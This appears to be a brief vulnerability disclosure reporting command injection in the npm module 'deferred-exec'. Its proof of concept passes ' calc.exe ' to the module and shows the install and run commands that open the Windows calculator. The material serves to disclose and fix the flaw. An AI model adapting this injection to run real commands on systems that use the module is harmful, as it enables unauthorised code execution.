# Description

Command Injection in deferred-exec

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var a = require("deferred-exec");
a(" calc.exe ",{});
```

2. Execute the following commands in terminal:

```
npm i deferred-exec # Install affected module
node poc.js #  Run the PoC
```

3. On execution, windows application "calc.exe" will get open.
